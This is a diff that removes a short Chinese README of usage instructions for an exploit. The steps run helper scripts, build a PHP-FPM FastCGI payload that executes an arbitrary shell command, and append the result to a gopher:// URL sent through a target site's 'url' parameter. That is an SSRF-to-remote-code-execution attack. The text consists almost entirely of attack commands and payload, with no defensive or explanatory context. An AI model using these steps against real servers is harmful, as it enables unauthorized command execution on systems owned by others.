@@ -1,6 +1,0 @@
-先运行sh create_exp.sh
-然后开启另外一个窗口运行下面的命令，其中ls的位置可以替换成任意命令
-
-python fpm.py 127.0.0.1 -p 9000 /usr/local/lib/php/PEAR.php -c '<?php echo `ls`; exit;?>'
-
-生成的内容加在'http://target.com/?url=gopher://127.0.0.1:9000/_'后面
